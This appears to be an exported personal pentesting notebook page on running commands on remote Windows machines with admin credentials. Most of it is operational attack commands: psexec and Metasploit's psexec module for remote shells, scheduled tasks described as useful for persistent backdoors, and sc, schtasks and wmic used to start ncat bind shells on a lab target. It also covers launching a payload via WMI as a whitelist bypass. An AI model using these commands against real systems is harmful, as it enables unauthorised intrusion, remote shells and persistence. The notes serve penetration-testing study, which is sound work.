<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>remote commands (Windows)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>remote commands (Windows)</h1><br/><strong>Prerequisite</strong><br />• Credential for the remote computer<br /><br /><strong><h3>Run Commands on a Remote Windows Machine</h3></strong><br />To run the commands below first we need to setup a connection with the remote machine<br />    <span style="color:#a5452a;">example</span><br />    set up a SMB session<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; net use <span style="color:#ff9d00;font-weight:700">\\</span>[targetIP] <span style="color:#ff9d00;font-weight:700">/</span>u<span style="color:#ff9d00;font-weight:700">:</span>[admin_user]</pre></div><br />1) <strong>psexec</strong><br />   ◇ free available from Microsoft Sysinternals but not built into Windows<br />     <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; psexec <span style="color:#ff9d00;font-weight:700">\\</span>[targetIP] [<span style="color:#ff9d00;font-weight:700">-</span>d] [<span style="color:#ff9d00;font-weight:700">-</span>u user] [<span style="color:#ff9d00;font-weight:700">-</span>p password] [command]</pre></div><br />       <strong> -s</strong> → the command runs with local SYSTEM privileges on the target<br />        <strong>-d</strong> → psexec don&#39;t wait for process to terminate (non-interactive), useful when invoking a backdoor process, like as a Netcat listener running in the background<br />     PsExec the first time that is been executed create the PsExec service on that target machine and <span style="text-decoration:underline;">is NOT cleaned up once finished</span>. We have to go back and manually remove the PsExec service using the sc command. Note that PsExec module in Metasploit and the PsExec NSE script in Nmap do clean up the services once finished.<br />     <span style="color:#a5452a;">examples:</span><br />     <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; psexec.exe <span style="color:#ff9d00;font-weight:700">\\</span><span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">1.118</span> ipconfig</pre></div><br />     <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; psexec.exe <span style="color:#ff9d00;font-weight:700">\\</span><span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">1.118</span> cmd.exe     <span style="color:#0088ff;font-weight:400">#gained remote shell on the target machine</span></pre></div><br />        <a href=""><img src="images/1092-1.png" alt="images/1092-1.png" /></a><br />   ◇ psexec exploit module included in Metasploit<br />    <div class="codebox"><pre>msf&gt; use exploit<span style="color:#ff9d00;font-weight:700">/</span>windows<span style="color:#ff9d00;font-weight:700">/</span>smb<span style="color:#ff9d00;font-weight:700">/</span>psexec</pre></div><br />      1- PsExec module establishes the connection<br />      2- writes an executable with a pseudorandom name into the target&#39;s file system<br />      3- creates a service on the target machine, with the service name being a pseudorandom string<br />      4- the service run the executable payload that we have selected. <br />      5- clean up once finished, it deletes the executable and removes the service<br />2) <strong>at</strong> or <strong>schtasks</strong> commands to <em><span style="text-decoration:underline;">schedule</span></em> a job a short time in the future. Useful for persistent BackDoors<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; <span style="color:#ff9d00;font-weight:700">sc</span> <span style="color:#ff9d00;font-weight:700">\\</span>[targetIP] query schedule        <span style="color:#0088ff;font-weight:400">#verify first that schedule service is RUNNING</span><br />C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; <span style="color:#ff9d00;font-weight:700">sc</span> <span style="color:#ff9d00;font-weight:700">\\</span>[targetIP] <span style="color:#ff9d00;font-weight:700">start</span> schedule        <span style="color:#0088ff;font-weight:400">#start schedule service if not running</span><br />C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; net time <span style="color:#ff9d00;font-weight:700">\\</span>[targetIP]</pre></div><br />   ◇ <strong>at</strong> → simpler syntax but limited because we can not select a given user to run the commands(all jobs are run as “SYSTEM”). Moreover from Windows 8.1 the command is been deprecated replaced by schtasks.      <br />        <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; at [<span style="color:#ff9d00;font-weight:700">\\</span>targetIP] [HH<span style="color:#ff9d00;font-weight:700">:</span>MM][A|P] [command]<br />C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; at [<span style="color:#ff9d00;font-weight:700">\\</span>targetIP]                            <span style="color:#0088ff;font-weight:400">#verify the schedule</span></pre></div><br />        HH:MM → time for the job to start<br />        A|P → A stand for AM. P stand for PM.<br />   ◇ <strong>schtasks</strong> → <br />        <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; schtasks <span style="color:#ff9d00;font-weight:700">/</span>create <span style="color:#ff9d00;font-weight:700">/</span>tn [taskname] <span style="color:#ff9d00;font-weight:700">/</span>s [targetIP] <span style="color:#ff9d00;font-weight:700">/</span>u [user] <span style="color:#ff9d00;font-weight:700">/</span>p [password] <span style="color:#ff9d00;font-weight:700">/sc</span> [frequency] <span style="color:#ff9d00;font-weight:700">/</span>st [starttime] <span style="color:#ff9d00;font-weight:700">/</span>sd [startdate] <span style="color:#ff9d00;font-weight:700">/</span>tr [command]<br />C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; schtasks <span style="color:#ff9d00;font-weight:700">/</span>query <span style="color:#ff9d00;font-weight:700">/</span>s [targetIP]              <span style="color:#0088ff;font-weight:400">#verify the schedule</span></pre></div><br />        /st [starttime] → HH:MM:SS format<br />        /sc [frequency] → ONCE, MINUTE, HOURLY, DAILY, WEEKLY, ONSTART(every time the system starts),...<br />    <span style="color:#a5452a;">example:</span><br />    create a netcat listner on port 9999 of the target<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; schtasks <span style="color:#ff9d00;font-weight:700">/</span>create <span style="color:#ff9d00;font-weight:700">/</span>tn test1 <span style="color:#ff9d00;font-weight:700">/</span>s <span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">1.118</span> <span style="color:#ff9d00;font-weight:700">/</span>u danie <span style="color:#ff9d00;font-weight:700">/</span>p Pass <span style="color:#ff9d00;font-weight:700">/sc</span> once <span style="color:#ff9d00;font-weight:700">/</span>st <span style="color:#333333;font-weight:400">12</span><span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">48</span> <span style="color:#ff9d00;font-weight:700">/</span>tr <span style="color:#3ad900;font-weight:400">&quot;C:\Users\danie\Desktop\ncat\ncat.exe --exec cmd.exe -vnl 9999&quot;</span><br />C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; ncat.exe <span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">1.118</span> <span style="color:#333333;font-weight:400">9999</span>      <span style="color:#0088ff;font-weight:400">#to connect to the shell created</span></pre></div><br />3) <strong>sc</strong> make a command into a service and run it<br />    Note that there must be a space between “binpath=” and and the command that usually start with the quotation mark <em>&quot;</em><br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; <span style="color:#ff9d00;font-weight:700">sc</span> <span style="color:#ff9d00;font-weight:700">\\</span>[targetIP] create [svcname] binpath<span style="color:#ff9d00;font-weight:700">=</span> [command]</pre></div><br />    <a href=""><img src="images/1092-2.png" alt="images/1092-2.png" /></a><br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; <span style="color:#ff9d00;font-weight:700">sc</span> <span style="color:#ff9d00;font-weight:700">\\</span>[targetIP] query [svcname]</pre></div><br />    <a href=""><img src="images/1092-3.png" alt="images/1092-3.png" /></a><br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; <span style="color:#ff9d00;font-weight:700">sc</span> <span style="color:#ff9d00;font-weight:700">\\</span>[targetIP] <span style="color:#ff9d00;font-weight:700">start</span> [svcname]</pre></div><br />    the service [svcname] will run for only 30 seconds after that if not receive a call Windows kills it and return an error<br />    <a href=""><img src="images/1092-4.png" alt="images/1092-4.png" /></a><br />    <span style="color:#a5452a;">example:</span><br />    create a netcat listner on port 9998 of the target<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; <span style="color:#ff9d00;font-weight:700">sc</span> <span style="color:#ff9d00;font-weight:700">\\</span><span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">1.118</span> create test5 binpath<span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;C:\Users\danie\Desktop\ncat\ncat.exe --exec cmd.exe -vnl 9998&quot;</span><br />C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; <span style="color:#ff9d00;font-weight:700">sc</span> <span style="color:#ff9d00;font-weight:700">\\</span><span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">1.118</span> query test5<br />C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; <span style="color:#ff9d00;font-weight:700">sc</span> <span style="color:#ff9d00;font-weight:700">\\</span><span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">1.118</span> <span style="color:#ff9d00;font-weight:700">start</span> test5        <span style="color:#0088ff;font-weight:400">#we can check the listener on the target machine with: netstat -ano | find &quot;:9998&quot;</span><br />     <span style="color:#0088ff;font-weight:400">## in a new window run the next command ##</span><br />C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; ncat.exe <span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">1.118</span> <span style="color:#333333;font-weight:400">9998</span>           <span style="color:#0088ff;font-weight:400">#we have to hurry to run the this command because we have the listener only for 30 seconds</span></pre></div><br /><br />6) <strong>wmic</strong> command, built in to WinXP Pro through Windows 10, can be used to manage Windows 2000 and later systems<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; wmic <span style="color:#ff9d00;font-weight:700">/</span>node<span style="color:#ff9d00;font-weight:700">:</span>[targetIP] <span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">:</span>[admin_user] <span style="color:#ff9d00;font-weight:700">/</span>password<span style="color:#ff9d00;font-weight:700">:</span>[password] <span style="color:#ff9d00;font-weight:700">process</span> call create [command]   <span style="color:#0088ff;font-weight:400">#create process</span></pre></div><br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; wmic <span style="color:#ff9d00;font-weight:700">/</span>node<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">1.118</span> <span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">:</span>danie <span style="color:#ff9d00;font-weight:700">/</span>password<span style="color:#ff9d00;font-weight:700">:</span>Pass <span style="color:#ff9d00;font-weight:700">process</span> <span style="color:#ff9d00;font-weight:700">where</span> processid<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#3ad900;font-weight:400">&quot;[PID]&quot;</span> delete    <span style="color:#0088ff;font-weight:400">#delete process</span></pre></div><br />    <span style="color:#a5452a;">example:</span><br />    create a netcat listner on port 9997 of the target<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; wmic <span style="color:#ff9d00;font-weight:700">/</span>node<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">1.118</span> <span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">:</span>danie <span style="color:#ff9d00;font-weight:700">/</span>password<span style="color:#ff9d00;font-weight:700">:</span>Pass <span style="color:#ff9d00;font-weight:700">process</span> call create <span style="color:#3ad900;font-weight:400">&quot;C:\Users\danie\Desktop\ncat\ncat.exe --exec cmd.exe -vnl 9997&quot;</span><br />C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; ncat.exe <span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">1.118</span> <span style="color:#333333;font-weight:400">9997</span>     <span style="color:#0088ff;font-weight:400">#to connect to the shell created</span></pre></div><br />7) <strong>Get-WmiObject </strong><br />    This allow us to create arbitrary processes that will be run as a child process of the process WmiPrvSE.exe(WMI provider host) process.<br />    <span style="text-decoration:underline;">Whitelist bypass:</span> This can be beneficial in regards to execute a process through other that is likely already a trusted one<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">Get-WmiObject</span> <span style="color:#ff9d00;font-weight:700">-</span>List Win32_Process).Create(<span style="color:#3ad900;font-weight:400">&quot;Payload.exe&quot;</span>)</pre></div><br />8) <strong>Invoke-WmiMethod</strong><br />    Very similar to the above <span style="text-decoration:underline;">Get-WmiObject</span><strong> </strong><br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">Invoke-WmiMethod</span> <span style="color:#ff9d00;font-weight:700">-</span>Class Win32_Process <span style="color:#333333;font-weight:400">-Name</span> create <span style="color:#ff9d00;font-weight:700">-</span>ArgumentList Payload.exe <span style="color:#ff9d00;font-weight:700">-</span>ComputerName <span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">147.136</span> <span style="color:#ff9d00;font-weight:700">-</span>Credential &lt;username&gt;</pre></div><br />    <a href=""><img src="images/1092-5.png" alt="images/1092-5.png" /></a></div>
</body>
</html>
